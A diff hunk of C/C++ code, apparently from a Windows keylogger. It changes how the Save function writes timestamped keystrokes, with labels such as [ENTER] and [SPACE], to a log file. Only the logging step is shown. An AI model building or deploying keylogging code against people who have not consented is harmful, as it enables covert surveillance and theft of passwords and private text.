@@ -95,16 +95,16 @@ int Save(int key_stroke, char *file)
 
     char buff[100];
     snprintf(buff, sizeof(buff), "%02d:%02d:%02d:%03d", t->tm_hour, t->tm_min, t->tm_sec, tp.tv_usec/1000);
-    std::string buffAsStdStr = buff;
+    //std::string buffAsStdStr = buff;
 
     std::cout << key_stroke << '\n';
 
     if (key_stroke == VK_BACK)
         fprintf(OUTPUT_FILE, "%s    %s\n", buff, "[BACKSPACE]");
     else if (key_stroke == VK_RETURN)
-        fprintf(OUTPUT_FILE, "%s    %s", buff, "\n");
+        fprintf(OUTPUT_FILE, "%s    %s\n", buff, "[ENTER]");
     else if (key_stroke == VK_SPACE)
-        fprintf(OUTPUT_FILE, "%s    %s\n", buff, " ");
+        fprintf(OUTPUT_FILE, "%s    %s\n", buff, "[SPACE]");
     else if (key_stroke == VK_TAB)
         fprintf(OUTPUT_FILE, "%s    %s\n", buff, "[TAB]");
     else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
